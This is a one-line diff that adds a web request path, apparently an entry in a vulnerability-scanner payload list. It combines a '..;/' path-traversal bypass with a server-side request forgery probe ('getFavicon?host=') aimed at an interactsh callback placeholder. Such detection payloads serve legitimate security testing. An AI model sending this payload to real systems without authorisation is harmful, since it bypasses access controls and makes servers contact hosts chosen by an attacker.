@@ -1,0 +1,1 @@
+/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
